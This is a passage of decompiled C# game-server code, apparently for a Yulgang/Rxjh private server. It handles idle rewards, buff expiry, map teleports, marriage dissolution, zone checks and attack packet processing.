						WXhmtime = DateTime.Now;
					}
				}
				if ((int)DateTime.Now.Subtract(SThmtime).TotalMinutes >= 3 && 师傅数据.TID != -1)
				{
					Players players2 = World.检查玩家name(师傅数据.STNAME);
					if (players2 != null)
					{
						int num5 = 2000;
						if (师傅数据.STLEVEL == 4)
						{
							num5 = 2000;
						}
						else if (师傅数据.STLEVEL == 3)
						{
							num5 = 2000;
						}
						else if (师傅数据.STLEVEL == 2)
						{
							num5 = 2000;
						}
						else if (师傅数据.STLEVEL == 1)
						{
							num5 = ((师傅数据.STYHD < 20000) ? 50 : 0);
						}
						师傅数据.TLEVEL = base.Player_Level;
						师傅数据.STYHD += num5;
						徒弟更新师徒系统();
						for (int i = 0; i < 3; i++)
						{
							if (players2.徒弟数据[i].TID == 师傅数据.TID)
							{
								players2.徒弟数据[i].TLEVEL = base.Player_Level;
								players2.徒弟数据[i].STYHD += num5;
								players2.师傅更新师徒系统(i);
								break;
							}
						}
						SThmtime = DateTime.Now;
						系统提示("在线" + 3 + "分钟得到2000点的贡献度。");
					}
				}
				num = 3;
				if (World.是否开启挂机奖励 == 1)
				{
					if ((int)DateTime.Now.Subtract(CJhmtime).TotalMinutes >= World.挂机抽奖时间周期 && base.Player_Level >= World.挂机抽奖要求等级 && !base.Client.挂机 && !base.Client.假人)
					{
						CJhmtime = DateTime.Now;
						CheckTreasureGems();
						if (World.挂机奖励抽奖次数 != 0)
						{
							检察抽奖数据(World.挂机奖励抽奖次数, 1, "挂机");
						}
						SaveGemData();
					}
					if ((int)DateTime.Now.Subtract(PKhmtime).TotalMinutes >= World.挂机奖励时间周期 && base.Player_Level >= World.挂机奖励要求等级 && !base.Client.挂机 && !base.Client.假人)
					{
						PKhmtime = DateTime.Now;
						if (检查玩家是否在挂机双倍区域(this) && World.挂机双倍时间段.Length > 0)
						{
							if (World.挂机双倍时间段 == "0")
							{
								系统提示("您当前位置处于挂机双倍区域, 将获得双倍元宝奖励。");
							}
							else
							{
								string[] array3 = World.挂机双倍时间段.Split(';');
								if (DateTime.Now.Hour >= int.Parse(array3[0]) && DateTime.Now.Hour <= int.Parse(array3[1]))
								{
									string[] array4 = new string[5] { "您当前处于挂机双倍时间段[每天", null, null, null, null };
									array4[1] = int.Parse(array3[0]).ToString();
									array4[2] = "~";
									array4[3] = int.Parse(array3[1]).ToString();
									array4[4] = "点]的区域, 将获得双倍元宝奖励。";
									系统提示(string.Concat(array4));
									num3 = 2;
								}
							}
						}
						CheckTreasureGems();
						if (World.EnableServerWideExp != null)
						{
							num2 = 2;
						}
						if (base.FLD_VIP == 1)
						{
							检察元宝数据(World.会员挂机奖励元宝 * num3, 1, "挂机");
							if (World.会员挂机奖励钻石 != 0)
							{
								CheckGemPointsData(World.普通挂机奖励钻石, 1, "挂机");
							}
							base.Player_WuXun += World.会员挂机奖励武勋 * num2;
							更新武功和状态();
							系统提示("VIP玩家挂机奖励:[" + World.会员挂机奖励元宝 + "]元宝, 和[" + World.会员挂机奖励武勋 * num2 + "]武勋。");
						}
						else
						{
							检察元宝数据(World.普通挂机奖励元宝 * num3, 1, "挂机");
							base.Player_WuXun += World.普通挂机奖励武勋 * num2;
							if (World.普通挂机奖励钻石 != 0)
							{
								CheckGemPointsData(World.普通挂机奖励钻石, 1, "挂机");
							}
							更新武功和状态();
							系统提示("普通玩家挂机奖励:[" + World.普通挂机奖励元宝 + "]元宝, 和[" + World.普通挂机奖励武勋 * num2 + "]武勋。");
						}
						SaveGemData();
						FLD_是否可以送花 = true;
						检测婚姻状态();
					}
					num = 7;
				}
				else if (base.人物善恶 < 0)
				{
					if ((int)DateTime.Now.Subtract(PKhmtime).TotalMinutes >= World.挂机奖励时间周期)
					{
						PKhmtime = DateTime.Now;
						base.人物善恶 += 170;
						更新武功和状态();
						FLD_是否可以送花 = true;
						检测婚姻状态();
					}
					num = 8;
				}
				if (base.人物坐标_地图 > 32100 && base.人物坐标_地图 < 32110 && 是否为药品世外() != 0)
				{
					if (World.老泫勃派开关 == 1)
					{
						系统提示("世外武林时间结束, 自动传送到泫勃派。");
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						系统提示("世外武林时间结束, 自动传送到泫勃派。");
						移动(560f, 1550f, 15f, 101);
					}
				}
				num = 9;
				if (base.人物坐标_地图 == 32001 && 是否为药品皮皮岛() != 0)
				{
					if (World.老泫勃派开关 == 1)
					{
						系统提示("皮皮岛时间结束, 自动传送到泫勃派。");
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						系统提示("皮皮岛时间结束, 自动传送到泫勃派。");
						移动(560f, 1550f, 15f, 101);
					}
				}
				num = 10;
				if (base.人物坐标_地图 == 32002 && 是否为药品遗忘() != 0)
				{
					if (World.老泫勃派开关 == 1)
					{
						系统提示("遗忘时间结束, 自动传送到泫勃派。");
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						系统提示("遗忘时间结束, 自动传送到泫勃派。");
						移动(560f, 1550f, 15f, 101);
					}
				}
				if (base.人物坐标_地图 == World.剑皇圣地地图 && base.Player_WuXun < World.剑皇圣地武勋)
				{
					移动(560f, 1550f, 15f, 101);
					系统提示("检测到武勋不足100万,玩家自动传回泫勃派。");
				}
				num = 11;
				if ((base.人物坐标_地图 == 30000 || base.人物坐标_地图 == 30100 || base.人物坐标_地图 == 30200 || base.人物坐标_地图 == 30300) && 是否为药品修炼() != 0)
				{
					if (World.老泫勃派开关 == 1)
					{
						系统提示("修炼时间结束, 自动传送到泫勃派。");
						移动(495f, 1727f, 15f, 29000);
					}
					else
					{
						系统提示("修炼时间结束, 自动传送到泫勃派。");
						移动(560f, 1550f, 15f, 101);
					}
				}
				if (公有药品.Count > 0)
				{
					foreach (公有药品类 value2 in 公有药品.Values)
					{
						DateTime t = new DateTime(1970, 1, 1, 8, 0, 0).AddSeconds(value2.时间);
						if (t < DateTime.Now)
						{
							清理符(value2.药品ID);
						}
					}
				}
				num = 12;
				if (base.Client == null)
				{
					if (查坐标 != null)
					{
						查坐标.Close();
						查坐标.Dispose();
						查坐标 = null;
					}
					return;
				}
				num = 13;
				if (!base.Client.Running)
				{
					if (查坐标 != null)
					{
						查坐标.Close();
						查坐标.Dispose();
						查坐标 = null;
						if (攻击器 != null)
						{
							攻击器.Close();
							攻击器.Dispose();
							攻击器 = null;
						}
					}
					return;
				}
				num = 14;
				if (!World.ConnectionList.TryGetValue(base.Client.WorldId, out var _))
				{
					base.Client.Dispose();
					Logout();
					Dispose();
					return;
				}
				num = 15;
				if (!MoveAllto(70, 新坐标))
				{
					num = 16;
					获取复查范围玩家();
					num = 17;
					获取复查范围Npc();
					num = 18;
					获取复查范围地面物品();
					num = 19;
					触发自动攻击();
					num = 20;
					新坐标.Rxjh_X = base.人物坐标_X;
					新坐标.Rxjh_Y = base.人物坐标_Y;
					新坐标.Rxjh_Map = base.人物坐标_地图;
				}
				if (base.Client.假人 && 云挂机踢号)
				{
					World.假人数量--;
					World.CloudAfkCount--;
					base.Client.DisposedOffline();
					MainForm.WriteLine(1, "[" + base.UserName + "]退出云挂机...");
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, num + " MoveAll出错[" + base.人物全服ID + "]-[" + base.Userid + "]-[" + base.UserName + "]" + ex);
				Players players3 = World.检查玩家name(base.UserName);
				if (players3 != null && players3.Client != null)
				{
					players3.Client.Dispose();
				}
				MainForm.WriteLine(1, "用户踢出[" + base.Userid + "]-[" + base.UserName + "]");
			}
		}

		public void 清理符(int ID)
		{
			switch (ID)
			{
			case 1008000058:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000059:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000060:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				break;
			case 1008000061:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000062:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000063:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				break;
			case 1008000028:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000029:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				break;
			case 1008000141:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				break;
			case 1008000140:
				base.FLD_人物_追加_经验百分比 -= 0.25;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000311:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.2;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				break;
			case 1008000877:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.2;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				break;
			case 1008000320:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				break;
			case 1008000318:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				break;
			}
			公有药品.TryRemove(ID, out var _);
			if (base.FLD_人物_追加_经验百分比 < 0.0)
			{
				base.FLD_人物_追加_经验百分比 = 0.0;
			}
			if (base.FLD_人物_追加_历练百分比 < 0.0)
			{
				base.FLD_人物_追加_历练百分比 = 0.0;
			}
			if (base.FLD_人物_追加_获得游戏币百分比 < 0.0)
			{
				base.FLD_人物_追加_获得游戏币百分比 = 0.0;
			}
			if (base.FLD_人物_追加_合成成功率百分比 < 0.0)
			{
				base.FLD_人物_追加_合成成功率百分比 = 0.0;
			}
			if (base.FLD_人物_追加_贩卖价格百分比 < 0.0)
			{
				base.FLD_人物_追加_贩卖价格百分比 = 0.0;
			}
			if (base.FLD_人物_追加_吸魂几率百分比 < 0.0)
			{
				base.FLD_人物_追加_吸魂几率百分比 = 0.0;
			}
			if (base.FLD_人物_追加_武勋获得量百分比 < 0.0)
			{
				base.FLD_人物_追加_武勋获得量百分比 = 0.0;
			}
			if (!(base.FLD_人物_追加_物品掉落概率百分比 >= 0.0))
			{
				base.FLD_人物_追加_物品掉落概率百分比 = 0.0;
			}
		}

		public void 检测婚姻状态()
		{
			try
			{
				if (解除关系倒计时 <= 0)
				{
					return;
				}
				解除关系倒计时 -= World.挂机奖励时间周期;
				if (解除关系倒计时 > 0)
				{
					return;
				}
				byte[] array = Converter.hexStringToByte("AA558E002C017C1780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000568055AA");
				情侣提示(10, base.UserName, base.FLD_情侣);
				Players players = 得到人物数据(base.FLD_情侣);
				if (players != null)
				{
					players.FLD_是否可以送花 = false;
					players.是否已婚 = 0;
					players.情侣提示(10, players.UserName, players.FLD_情侣);
					players.FLD_情侣 = string.Empty;
					players.FLD_情侣_爱情度 = 0;
					players.武功新[2, 16] = null;
					players.武功新[2, 17] = null;
					players.婚戒刻字 = string.Empty;
					players.解除关系倒计时 = 0;
					players.更新武功和状态();
					players.更新人物数据(players);
					players.更新广播人物数据();
					Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 4, 2);
					if (players.Client != null)
					{
						players.Client.Send多包(array, array.Length);
					}
				}
				else
				{
					RxjhClass.解除情侣关系(base.FLD_情侣);
				}
				是否已婚 = 0;
				FLD_是否可以送花 = false;
				解除关系倒计时 = 0;
				婚戒刻字 = string.Empty;
				base.FLD_情侣 = string.Empty;
				base.FLD_情侣_爱情度 = 0;
				武功新[2, 16] = null;
				武功新[2, 17] = null;
				婚戒刻字 = string.Empty;
				更新武功和状态();
				更新人物数据(this);
				更新广播人物数据();
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send多包(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public bool MoveAllto(int far_, 坐标Class 坐标)
		{
			if (坐标.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = 坐标.Rxjh_X - base.人物坐标_X;
			float num2 = 坐标.Rxjh_Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public void 传送点移动(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 26, array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			switch (num)
			{
			case 1:
				移动(0f, -80f, 15f, base.人物坐标_地图 - 1);
				return;
			case 2:
				移动(0f, 80f, 15f, base.人物坐标_地图 + 1);
				return;
			}
			foreach (MoveClass item in World.Mover)
			{
				if (item.MAP != base.人物坐标_地图 || item.ToMAP != num)
				{
					continue;
				}
				float num2 = item.X - base.人物坐标_X;
				float num3 = item.Y - base.人物坐标_Y;
				if (!((double)(int)Math.Sqrt((double)num2 * (double)num2 + (double)num3 * (double)num3) <= 200.0))
				{
					continue;
				}
				if (base.FLD_VIP == 0)
				{
					string vIP地图 = World.VIP地图;
					char[] separator = new char[1] { ';' };
					string[] array2 = vIP地图.Split(separator);
					string[] array3 = array2;
					string[] array5 = array3;
					foreach (string b in array5)
					{
						if (坐标Class.getmapname(item.ToMAP) == b)
						{
							系统提示("本地图名是会员地图，非会员不可以进入。");
							return;
						}
					}
				}
				string[] array4 = World.地图锁定.Split(';');
				if (array4.Length >= 1)
				{
					for (int i = 0; i < array4.Length; i++)
					{
						if (int.Parse(array4[i]) == base.人物坐标_地图)
						{
							return;
						}
					}
				}
				移动(item.ToX, item.ToY, item.ToZ, item.ToMAP);
				if (item.ToMAP == 43001)
				{
					ConcurrentDictionary<int, NpcClass> concurrentDictionary = MapClass.GetnpcTemplate(43001);
					if (concurrentDictionary != null)
					{
						NpcClass.更新NPC复活数据(concurrentDictionary, this);
						NpcClass.发送当前显示的讨伐副本怪物(concurrentDictionary, this);
					}
				}
				return;
			}
			MainForm.WriteLine(2, "传送点移动 " + base.Userid + " " + base.UserName + " " + base.人物坐标_X + " " + base.人物坐标_Y + " " + base.人物坐标_地图 + " " + num);
		}

		public void 触发移动坐标()
		{
			foreach (MoveClass item in World.Mover)
			{
				if (item.MAP == base.人物坐标_地图)
				{
					float num = item.X - base.人物坐标_X;
					float num2 = item.Y - base.人物坐标_Y;
					if ((double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= 20.0)
					{
						移动(item.ToX, item.ToY, item.ToZ, item.ToMAP);
					}
				}
			}
		}

		public bool 检查玩家是否在对练区内(Players Playe)
		{
			foreach (坐标Class item in World.对练区)
			{
				if (item.Rxjh_Map == Playe.人物坐标_地图)
				{
					float num = item.Rxjh_X - Playe.人物坐标_X;
					float num2 = item.Rxjh_Y - Playe.人物坐标_Y;
					if ((double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)World.场地有效范围)
					{
						return true;
					}
				}
			}
			return false;
		}

		public bool 检查玩家是否在比武泡点区内(Players Playe)
		{
			try
			{
				foreach (坐标Class item in World.比武泡点区)
				{
					if (item.Rxjh_Map == Playe.人物坐标_地图 && (double)Playe.人物坐标_X < 205.0 && (double)Playe.人物坐标_X > 38.0 && (double)Playe.人物坐标_Y < 83.0 && (double)Playe.人物坐标_Y > -89.0)
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		public bool 检查玩家是否在仙魔大战区域内(Players Playe)
		{
			try
			{
				foreach (坐标Class item in World.仙魔大战区域)
				{
					if (item.Rxjh_Map == Playe.人物坐标_地图 && (double)Playe.人物坐标_X < 70.0 && (double)Playe.人物坐标_X > -280.0 && (double)Playe.人物坐标_Y < 120.0 && (double)Playe.人物坐标_Y > -230.0)
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		public bool 检查玩家是否在势力战区域内(Players Playe)
		{
			try
			{
				foreach (坐标Class item in World.势力战区域)
				{
					if (item.Rxjh_Map == Playe.人物坐标_地图 && (double)Playe.人物坐标_X < 290.0 && (double)Playe.人物坐标_X > -290.0 && (double)Playe.人物坐标_Y < 150.0 && !((double)Playe.人物坐标_Y <= -150.0))
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		public bool 触发新手安全区(Players play)
		{
			if (!World.地图安全区.TryGetValue(play.人物坐标_地图, out var value))
			{
				return false;
			}
			if (play.人物坐标_X > value.FLD_X && play.人物坐标_X < value.坐标_X)
			{
				if (play.人物坐标_Y > value.FLD_Y && play.人物坐标_Y < value.坐标_Y)
				{
					系统提示("城内为安全区,禁止PK", 9, "系统提示");
					return true;
				}
			}
			else if (base.人物坐标_X > value.FLD_X && base.人物坐标_X < value.坐标_X && base.人物坐标_Y > value.坐标_Y && base.人物坐标_Y < value.坐标_Y)
			{
				系统提示("城内为安全区,禁止PK", 9, "系统提示");
				return true;
			}
			return false;
		}

		public bool 检查玩家是否在帮战区内(Players Playe)
		{
			try
			{
				foreach (坐标Class item in World.帮战区)
				{
					if (item.Rxjh_Map == Playe.人物坐标_地图 && (double)Playe.人物坐标_X < 350.0 && (double)Playe.人物坐标_X > -350.0 && (double)Playe.人物坐标_Y < 350.0 && (double)Playe.人物坐标_Y > -350.0)
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		public bool 安全区禁止下毒(Players playe)
		{
			try
			{
				if (!World.地图安全区.TryGetValue(playe.人物坐标_地图, out var value))
				{
					return false;
				}
				return playe.人物坐标_地图 == value.地图编号 && playe.人物坐标_X > value.FLD_X && (double)playe.人物坐标_Y > (double)value.FLD_Y && playe.人物坐标_X < value.坐标_X && playe.人物坐标_Y < value.坐标_Y;
			}
			catch
			{
				return false;
			}
		}

		public bool 检查怪物距离(NpcClass Npc)
		{
			if (Npc.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = Npc.X - base.人物坐标_X;
			float num2 = Npc.Y - base.人物坐标_Y;
			float num3 = (int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2);
			if (base.Player_Job == 4)
			{
				if ((double)num3 <= 60.0)
				{
					return true;
				}
			}
			else if (base.Player_Job == 5)
			{
				if ((double)num3 <= 60.0)
				{
					return true;
				}
			}
			else if (base.Player_Job == 7)
			{
				if ((double)num3 <= 60.0)
				{
					return true;
				}
			}
			else if ((double)num3 <= 30.0)
			{
				return true;
			}
			return false;
		}

		public void 江湖小助手(byte[] data, int length)
		{
			try
			{
				封包修改(data, length);
				if (data[10] == 0)
				{
					江湖小助手打怪模式 = 0;
					江湖小助手武功ID = 0;
					系统提示("停止挂机", 50, "提示");
				}
				if (data[10] == 1)
				{
					江湖小助手打怪模式 = 1;
					自动挂机坐标X = (int)base.人物坐标_X;
					自动挂机坐标Y = (int)base.人物坐标_Y;
					自动挂机地图 = base.人物坐标_地图;
					江湖小助手武功ID = 得到最高武功();
					系统提示("开始挂机", 50, "提示");
				}
				if (data[10] == 2)
				{
					系统提示("自动复活", 50, "提示");
				}
				if (data[10] == 3)
				{
					系统提示("延迟复活(10分钟)", 50, "提示");
				}
				if (data[10] == 4)
				{
					系统提示("手动复活", 50, "提示");
				}
				if (data[10] == 5)
				{
					系统提示("开启隐藏建筑", 50, "提示");
				}
				if (data[10] == 6)
				{
					系统提示("关闭隐藏建筑", 50, "提示");
				}
				if (data[10] == 7)
				{
					系统提示("开启CPU优化", 50, "提示");
				}
				if (data[10] == 8)
				{
					系统提示("关闭CPU优化", 50, "提示");
				}
			}
			catch
			{
			}
		}

		public void 攻击(byte[] data, int length)
		{
			try
			{
				if (World.当前是否是银币线路 == 1 && base.人物坐标_地图 != 8001 && base.人物坐标_地图 != 8002 && base.人物坐标_地图 != 8003 && base.人物坐标_地图 != 8004 && base.人物坐标_地图 != 8005 && base.人物坐标_地图 != 801 && base.人物坐标_地图 != 7101 && base.人物坐标_地图 != 7001 && base.人物坐标_地图 != 41001 && base.人物坐标_地图 != 2301 && base.人物坐标_地图 != 42001)
				{
					系统提示("银币市场互通线禁止活动外地图打怪PK。", 50, "系统提示");
					return;
				}
				封包修改(data, length);
				if (base.人物_HP <= 0 || base.Player死亡 || 退出中 || 交易.交易中 || 打开仓库中 || base.Client.挂机 || 进店中 || 人物锁定 || 个人商店 != null)
				{
					return;
				}
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				byte[] array3 = new byte[4];
				Buffer.BlockCopy(data, 18, array, 0, 4);
				Buffer.BlockCopy(data, 22, array2, 0, 4);
				Buffer.BlockCopy(data, 26, array3, 0, 4);
				if (潜行模式 == 1)
				{
					潜行状态(0);
				}
				byte[] array4 = new byte[4];
				Buffer.BlockCopy(data, 4, array4, 0, 2);
				int 人物iD = BitConverter.ToInt32(array4, 0);
				byte[] array5 = new byte[4];
				byte[] array6 = new byte[4];
				Buffer.BlockCopy(data, 14, array5, 0, 4);
				Buffer.BlockCopy(data, 10, array6, 0, 2);
				byte[] array7 = new byte[4];
				Buffer.BlockCopy(data, 34, array7, 0, 4);
				当前杀怪数量 = BitConverter.ToInt32(array7, 0);
				int num = BitConverter.ToInt32(array5, 0);
				int 人物ID = BitConverter.ToInt32(array6, 0);
				if (num == 0 && 江湖小助手打怪模式 == 1)
				{
					if (组队id != 0 && base.Player_Job == 5)
					{
						num = 501203;
						if (base.Player_Job_leve >= 6)
						{
							if (!追加状态列表.ContainsKey(501501))
							{
								num = 501501;
							}
							else if (!追加状态列表.ContainsKey(501502))
							{
								num = 501502;
							}
							else if (!追加状态列表.ContainsKey(501601))
							{
								num = 501601;
							}
							else if (!追加状态列表.ContainsKey(501602))
							{
								num = 501602;
							}
							else if (!追加状态列表.ContainsKey(501603))
							{
								num = 501603;
							}
							人物ID = base.人物全服ID;
						}
						else
						{
							if (!追加状态列表.ContainsKey(501301))
							{
								num = 501301;
							}
							else if (!追加状态列表.ContainsKey(501303))
							{
								num = 501303;
							}
							else if (!追加状态列表.ContainsKey(501401))
							{
								num = 501401;
							}
							else if (!追加状态列表.ContainsKey(501402))
							{
								num = 501402;
							}
							else if (!追加状态列表.ContainsKey(501403))
							{
								num = 501403;
							}
							人物ID = base.人物全服ID;
						}
					}
					else if (组队id != 0 && base.Player_Job == 4 && !追加状态列表.ContainsKey(401303))
					{
						num = 401303;
						if (!追加状态列表.ContainsKey(401202))
						{
							num = 401202;
						}
						else if (!追加状态列表.ContainsKey(401203))
						{
							num = 401203;
						}
						else if (!追加状态列表.ContainsKey(401301))
						{
							num = 401301;
						}
						else if (!追加状态列表.ContainsKey(401302))
						{
							num = 401302;
						}
						人物ID = base.人物全服ID;
					}
					else
					{
						num = 江湖小助手武功ID;
					}
				}
				if (base.人物坐标_地图 == 8001 && World.MartialBloodBattleProgress != 2)
				{
					系统提示("回合未开始, 禁止PK", 9, "系统提示");
				}
				else
				{
					攻击(num, 人物iD, 人物ID, array, array3, array2);
				}
			}
			catch
			{
			}
		}

		public void 攻击(int 武功ID, int 人物iD, int 人物ID, byte[] Rxjh__X, byte[] Rxjh__Y, byte[] Rxjh__Z)
		{
			try
			{
				base.人物坐标_X = BitConverter.ToSingle(Rxjh__X, 0);
				base.人物坐标_Y = BitConverter.ToSingle(Rxjh__Y, 0);
				上次坐标X = base.人物坐标_X;
				上次坐标Y = base.人物坐标_Y;
				移动时间 = DateTime.Now;
				int num = (int)DateTime.Now.Subtract(Pktime).TotalMilliseconds;
				if (World.外挂PK时间 <= 0 || 人物ID >= 10000 || 武功ID != Pk武功ID)
				{
					goto IL_00ca;
				}
				if (num < World.外挂PK时间)
				{
					发送激活技能数据(武功ID, 0);
					return;
				}
				if (num >= World.外挂PK时间 / 3)
				{
					goto IL_00ca;
				}
				发送激活技能数据(武功ID, 0);
				goto end_IL_0001;
				IL_037e:
				攻击确认次数 = 0;
				int num2 = 判断是否触发绝命技(this, 人物ID, 武功ID);
				武功类 武功类2 = World.TBL_KONGFU[武功ID];
				if (武功ID == 0 || 武功类2.FLD_TYPE < 5 || num2 != -1)
				{
					魔法攻击(武功ID, 人物ID);
					Pktime = DateTime.Now;
				}
				goto end_IL_0001;
				IL_00ca:
				Pk武功ID = 武功ID;
				if (人物灵兽 != null && 人物灵兽.骑 == 1 && 人物灵兽.宠物以装备[4].Get物品ID != 601100001 && 人物灵兽.宠物以装备[4].Get物品ID != 601100002 && 人物灵兽.宠物以装备[4].Get物品ID != 601100003 && 人物灵兽.宠物以装备[4].Get物品ID != 601100004 && 人物灵兽.宠物以装备[4].Get物品ID != 601100005 && 人物灵兽.宠物以装备[4].Get物品ID != 601100006 && 人物灵兽.宠物以装备[4].Get物品ID != 601100007 && 人物灵兽.宠物以装备[4].Get物品ID != 601100008)
				{
					发送激活技能数据(武功ID, 10);
					return;
				}
				if (异常状态 != null && GetAbnormalState(8))
				{
					发送激活技能数据(武功ID, 11);
					return;
				}
				if (base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201)
				{
					发送激活技能数据(武功ID, 11);
					return;
				}
				PK死亡 = false;
				Player无敌 = false;
				if (武功ID != 0)
				{
					if (num < 1500)
					{
						return;
					}
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (!World.TBL_KONGFU.TryGetValue(武功ID, out var value) || ((value.FLD_武功类型 == 0 || value.FLD_武功类型 == 3) && BitConverter.ToInt32(Rxjh__Z, 0) == 0))
					{
						return;
					}
					if (人物ID >= 10000 && World.是否允许快速攻击 == 0)
					{
						if (num >= value.FLD_TIME)
						{
							PkID = 人物ID;
							goto IL_037e;
						}
					}
					else if (num >= World.外挂PK时间)
					{
						PkID = 人物ID;
						goto IL_037e;
					}
					return;
				}
				if (num > 500)
				{
					攻击确认次数 = 0;
					物理攻击(武功ID, 人物ID);
					Pktime = DateTime.Now;
				}
				end_IL_0001:;
			}
			catch (Exception ex)
			{
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				MainForm.WriteLine(1, "物理攻击1|" + base.人物全服ID + "|" + ToString() + "|" + ex.Message);
			}
		}

		public void 移出势力战()
		{
			if (World.当前是否是银币线路 == 1)
			{
				移动(30f, 20f, 15f, 1201);
			}
			else
			{
				移动(529f, 1528f, 15f, 101);
			}
		}

		public static int 判断是否触发绝命技(Players player, int 人物ID, int 武功ID)
		{
			武功类 武功类2 = World.TBL_KONGFU[武功ID];
			if (player.装备栏已穿装备[3].Get物品ID == 0)
			{
				return -1;
			}
			if (人物ID < 10000)
			{
				return -1;
			}
